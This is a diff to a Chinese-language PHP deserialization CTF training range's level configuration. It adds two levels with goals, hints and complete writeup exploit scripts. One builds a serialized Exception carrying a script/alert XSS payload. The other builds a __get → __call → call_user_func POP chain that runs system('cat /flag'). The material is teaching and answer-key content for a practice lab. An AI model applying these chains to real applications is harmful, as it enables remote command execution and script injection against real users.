@@ -9,7 +9,7 @@ return [
 
 'site' => [
     'title' => '从 0 开始的 PHP 反序列化引导靶场',
-    'total' => 24,
+    'total' => 26,
 ],
 
 /* 章节:主页分组与关卡导航顺序 */
@@ -19,7 +19,7 @@ return [
     ['第三章 · 反序列化与魔术方法', [7, 8, 9, 10, 11, 12, 13, 14]],
     ['第四章 · POP 链与引用', [15, 16, 21]],
     ['第五章 · 字符串逃逸', [17, 18, 19, 20]],
-    ['第六章 · 真实攻击面', [22, 23, 24]],
+    ['第六章 · 原生类与真实攻击面', [22, 23, 24, 25, 26]],
 ],
 
 'levels' => [
@@ -727,6 +727,52 @@ echo \"o=\" . urlencode(serialize(new TJ_ITER())), \"\\n\";
 echo \"o=\" . urlencode(serialize(new HELLOCTF_READER())), \"\\n\";",
     ],
 ],
+
+25 => [
+    'title' => '原生类 · Error / Exception', 'mode' => 'guided', 'diff' => 2,
+    'tags' => ['原生类', 'XSS'],
+    'goal' => '页面会 echo 反序列化后的对象。构造一个 Exception,让输出带上 <code>&lt;script&gt;</code> 与 <code>alert</code>(flag 的判定就是它)。',
+    'know' => '当 POP 链找不到可用类时,PHP 的原生类可以"补位":Exception(以及 PHP 7+ 的 Error)自带 <code>__toString</code>,构造参数里的消息文本完全可控——被当成字符串输出时原样带出,是天然的 XSS 载体。',
+    'params' => [['method' => 'POST', 'name' => 'o', 'desc' => 'Exception 对象序列化串(URL编码)']],
+    'sources' => [['关卡源码', 'Level25/index.php']],
+    'key_lines' => [
+        ['from' => 15, 'to' => 17, 'label' => 'Exception 自带 __toString,echo 触发'],
+        ['from' => 19, 'to' => 21, 'label' => '输出含 script 与 alert 时给出 flag'],
+    ],
+    'hints' => [
+        '校验只认 Exception 的实例——它是 PHP 内置类,不需要自己定义,直接 new 就有。',
+        'Exception 构造函数的第一个参数是消息文本;它自带 __toString,对象被 echo 时消息原样输出。',
+        '构造 new Exception("<script>alert(1)</script>") 并 serialize 提交——页面输出本身就是一次 XSS 演示。',
+    ],
+    'wp' => [
+        'idea' => 'Exception 序列化后仍是 Exception 对象,echo 触发自带 __toString 输出可控消息,带上 script 与 alert 即通过校验。',
+        'exp' => "<?php\n// Exception 自带 __toString,echo 时输出可控内容(PHP 7+ 还有同门的 Error 类,用法一致)\n\$e = new Exception(\"<script>alert('helloctf')</script>\");\necho \"o=\" . urlencode(serialize(\$e));",
+    ],
+],
+
+26 => [
+    'title' => '魔术方法跳板 __get / __call', 'mode' => 'guided', 'diff' => 3,
+    'tags' => ['魔术方法', 'POP 链'],
+    'goal' => '串联两个跳板:<code>读取不存在的属性</code> → <code>调用不存在的方法</code> → <code>call_user_func</code>,执行 <code>cat /flag</code>。',
+    'know' => '访问不存在的属性触发 <code>__get</code>,调用不存在的方法触发 <code>__call</code>——它们是最常用的跳板:把上一环的出口变成下一环的入口,<code>call_user_func</code> 则是常见终点。',
+    'params' => [['method' => 'POST', 'name' => 'o', 'desc' => 'TJ_TRIGGER 对象序列化串(URL编码)']],
+    'sources' => [['关卡源码', 'Level26/index.php']],
+    'key_lines' => [
+        ['from' => 15, 'to' => 17, 'label' => '读取不存在属性 → __get'],
+        ['from' => 24, 'to' => 26, 'label' => '调用不存在方法 → __call → call_user_func'],
+        ['from' => 30, 'to' => 31, 'label' => '入口:读取 tj_anything 属性'],
+    ],
+    'hints' => [
+        '入口:$obj->tj_anything 读取的是不存在属性 → 需要 TJ_TRIGGER 的 __get。',
+        '__get 里执行 $this->helloctf_obj->run():让 helloctf_obj 是一个没有 run 方法的 HELLOCTF_CALL 对象 → 触发 __call。',
+        '__call 里 call_user_func($tj_fn, $probiusofficial_arg):tj_fn=system,arg=cat /flag。',
+    ],
+    'wp' => [
+        'idea' => '__get 跳板接 __call 跳板,call_user_func 完成命令执行。',
+        'exp' => "<?php\n// 链:\$obj->tj_anything(不存在属性) → __get → \$h->run()(不存在方法) → __call → call_user_func\nclass TJ_TRIGGER { public \$helloctf_obj; }\nclass HELLOCTF_CALL { public \$tj_fn; public \$probiusofficial_arg; }\n\n\$h = new HELLOCTF_CALL();\n\$h->tj_fn = 'system';\n\$h->probiusofficial_arg = 'cat /flag';\n\n\$t = new TJ_TRIGGER();\n\$t->helloctf_obj = \$h;\n\necho \"o=\" . urlencode(serialize(\$t));",
+    ],
+],
+
 
 ],
 
